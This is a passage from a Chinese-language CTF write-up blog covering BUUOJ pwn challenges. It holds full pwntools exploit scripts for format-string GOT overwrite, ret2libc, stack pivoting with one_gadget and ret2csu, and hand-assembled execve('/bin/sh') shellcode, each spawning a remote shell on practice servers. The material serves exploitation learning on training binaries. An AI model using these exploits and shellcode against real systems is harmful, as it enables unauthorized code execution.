remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29543</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(printf_got) +<span class="string">b&#x27;B&#x27;</span>+ <span class="string">&#x27;%8$s&#x27;</span></span><br><span class="line"><span class="comment">#‘A’  是用来补位的，这样后面的printf函数的got表地址就会在栈上相对距离为8的位置</span></span><br><span class="line"><span class="comment">#‘B’  相当于标记位，下面在接收数据的时候，接收到字符‘B’,后面跟着的就是我们泄露出来的函数地址  </span></span><br><span class="line"><span class="comment">#%8$s  利用格式化字符串漏洞的%8$s去泄露出栈上相对距离为8的地址上的值</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&#x27;me:&#x27;</span>, payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">printf_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;printf_addr&quot;</span>+<span class="built_in">hex</span>(printf_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line"></span><br><span class="line">libc_base=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr&quot;</span>+<span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:system&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;:&#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)</span></span><br><span class="line"><span class="string">第一个参数表示格式化字符串的偏移</span></span><br><span class="line"><span class="string">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；</span></span><br><span class="line"><span class="string">第三个参数表示已经输出的字符个数</span></span><br><span class="line"><span class="string">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写</span></span><br></pre></td></tr></table></figure>









<h2 id="others-babystack"><a href="#others-babystack" class="headerlink" title="others_babystack"></a>others_babystack</h2><p>2024.7.24</p>
<p>日常检查，不到干哈的</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514812.png" alt="image-20240724185933223"></p>
<p>运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514745.png" alt="image-20240724190111267"></p>
<p>感觉是绕canary的题</p>
<p>丢进ida里面看看</p>
<h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h2><p>2024.7.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514179.png" alt="image-20240724191438622"></p>
<p>运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514857.png" alt="image-20240724191732029"></p>
<p>丢进ida里面</p>
<p>偏移32</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515796.png" alt="image-20240724192542412"></p>
<p>一样</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515923.png" alt="image-20240724192616127"></p>
<p>存在漏洞</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515866.png" alt="image-20240724192841116"></p>
<p>puts函数直接泄露libc版本，溢出就行？</p>
<p><strong>32位puts函数泄露libc版本，fgets函数溢出</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25578</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x20</span>+<span class="number">4</span>)+ p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n\n&#x27;)</span></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">4</span>),system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>我靠，泄露半天，发现NX没开，直接ret2shellcode</p>
<p>啊啊啊啊啊。</p>
<p>ok，shellcode也不会，因为是</p>
<h3 id="汇编代码写shellcode"><a href="#汇编代码写shellcode" class="headerlink" title="汇编代码写shellcode"></a>汇编代码写shellcode</h3><p>我啥也不会！！！！</p>
<p>要自己手动写入的原因是：栈的大小只有0x20，不能完全写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode =&#x27;&#x27;&#x27;</span><br><span class="line">xor eax,eax             #eax置0</span><br><span class="line">xor edx,edx				#edx置0</span><br><span class="line">push edx				#将0入栈，标记了”/bin/sh”的结尾</span><br><span class="line">push 0x68732f2f         #传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh</span><br><span class="line">push 0x6e69622f         #传递“/bin”</span><br><span class="line">mov ebx,esp             #此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0xB              #eax置为execve函数的中断号</span><br><span class="line">int 0x80                #调用软中断</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode=asm（shellcode）</span><br></pre></td></tr></table></figure>

<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28314</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jump_esp=<span class="number">0x8048554</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)  <span class="comment">#23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload=shellcode.ljust(<span class="number">0x24</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(jump_esp)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)  <span class="comment"># 40</span></span><br><span class="line"></span><br><span class="line">payload+=asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>歪日！！！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27092</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h2><p>2024.7.25</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515646.png" alt="image-20240725093849498"></p>
<p>丢进ida里面</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515626.png" alt="image-20240725094136196"></p>
<p>东西很少哈，感觉就是libc版本泄露加read函数溢出，这个溢出的长度好像是够的，gdb动态调试看看，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515276.png" alt="image-20240725094746681"></p>
<p>96到112,(但是其实吧，bank在bss段上)，NX保护开着，应该传不了shellcode。</p>
<p>嘶！先看看能不能泄露出来吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"><span class="comment">#0x68+32=136</span></span><br><span class="line"><span class="comment">#是不是好像不够，要栈迁移还是用bank呢？</span></span><br><span class="line"><span class="comment">#bank的长度是完全够的</span></span><br></pre></td></tr></table></figure>

<p>现在有个问题就是bss段上的数组怎么确认长度 ，还是只能乖乖做栈迁移呢？（主要是栈迁移我不太会）长度一样试一试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29050</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400703</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004004c9</span> </span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;want\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;now!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6))</span></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>

<p>okok，肯定是不行的！<br>乖乖栈迁移吧</p>
<h3 id="栈迁移-2"><a href="#栈迁移-2" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>还要注意的是我们栈迁移到bank这的时候，发现距离GOT表太近，还得把栈抬高一点，并且在泄露libc基址的时候。还得使用一下one-gadget来解决system(&#x2F;bin&#x2F;sh)函数无法使用的情况。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">debug</span>):</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./borrowstack&#x27;</span>)</span><br><span class="line">    lib = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        r = process(<span class="string">&#x27;./borrowstack&#x27;</span>)</span><br><span class="line">        <span class="comment">#gdb.attach(r, &#x27;b *0x00000040069A&#x27;)</span></span><br><span class="line">        <span class="comment">#r = gdb.debug(&#x27;./borrowstack&#x27;, &#x27;b *0x000000000040068F&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26597</span>)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget = <span class="number">0x4526a</span></span><br><span class="line">    r.send(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x0000000000601080</span> + <span class="number">0x8</span> * <span class="number">9</span> - <span class="number">0x8</span>) + p64(<span class="number">0x0000000000400699</span>))</span><br><span class="line"></span><br><span class="line">    r.send(p64(<span class="number">0</span>) * <span class="number">9</span> + p64(<span class="number">0x0000000000400703</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x0000004006FA</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x000000000601028</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x601080</span> + <span class="number">0xa0</span> - <span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x000004006E0</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    libc = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - lib.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;lib \&#x27;s address =&gt; %#x&#x27;</span>%libc)</span><br><span class="line">    r.send(p64(libc + one_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">exp(debug)</span><br></pre></td></tr></table></figure>



<p><strong>one-gadget</strong> 是glibc里调用execve(’&#x2F;bin&#x2F;sh’, NULL, NULL)的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用system(“sh”)，这个时候one-gadget就可以搞定了。</p>
<p>  并且我看wp的时候也有re2csu做的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Debug == <span class="number">1</span>:</span><br><span class="line">	libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">	libc = ELF(libc_name)</span><br><span class="line">	one_gadget = <span class="number">0x4f432</span></span><br><span class="line">	p = process(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	libc_name = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">	libc = ELF(libc_name)</span><br><span class="line">	one_gadget = <span class="number">0x4526a</span></span><br><span class="line">	p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25202</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">bank_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">csu_init_pop = <span class="number">0x4006FA</span></span><br><span class="line">csu_init_call = <span class="number">0x4006E0</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">new_stack_sp = bank_addr + offset</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(new_stack_sp - <span class="number">0x10</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me what you want\n&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!You can check and use your borrow stack now!\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(new_stack_sp-<span class="number">0x10</span> - bank_addr) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) \</span><br><span class="line">+ p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+ p64(csu_init_pop) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) +p64(<span class="number">0x100</span>) \</span><br><span class="line">+ p64(new_stack_sp + <span class="number">0x8</span>*<span class="number">9</span>) + p64(<span class="number">0</span>) + p64(csu_init_call) </span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendline(p64(libc_base + one_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span>)</span><br><span class="line"><span class="comment"># print(hex(libc_base + libc.sym[&#x27;puts&#x27;]))</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><p>2024.7.25</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515872.png" alt="image-20240725160741072"></p>
<p>丢进ida里面</p>
<p>我靠。ida里面什么也没有？</p>
<p>欧克。仔细看就是分析汇编代码的题，也不长，分析一手</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 ; __int64 start()</span><br><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax        ;eax为0</span><br><span class="line">.text:08048068                 xor     ebx, ebx        ;ebx为0</span><br><span class="line">.text:0804806A                 xor     ecx, ecx        ;  一样</span><br><span class="line">.text:0804806C                 xor     edx, edx        ;  一样</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">;这几个是把“Let&#x27;s start the CTF:”字符入栈</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4           ;函数调用号为4，是write函数</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx        ;ebx为0</span><br><span class="line">.text:08048093                 mov     dl, 3Ch         ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3           ;函数调用号为3，是read函数</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -sys_read</span><br><span class="line">.text:08048099                 add     esp, 14h           </span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//程序开始调用write函数输出“Let&#x27;s start the CTF:”</span></span><br><span class="line"><span class="comment">//之后调用read函数</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>，buf，<span class="number">0x14</span>)</span><br><span class="line"><span class="built_in">read</span> (<span class="number">0</span>，buf，<span class="number">0x3C</span>)</span><br><span class="line"><span class="comment">//通过最后的add esp,14h 我们可以知道esp距离ret的地址0x14个字节（内平栈）</span></span><br><span class="line"><span class="comment">//也就是我们输入的参数buf的大小只有0x14，但是我们读入了0x3c，存在溢出漏洞</span></span><br></pre></td></tr></table></figure>

<p>因为没开NX，所以直接传shellcode就行，打ret2shellcode</p>
<p>要往栈上写入shellcode，首先要知道栈上的地址</p>
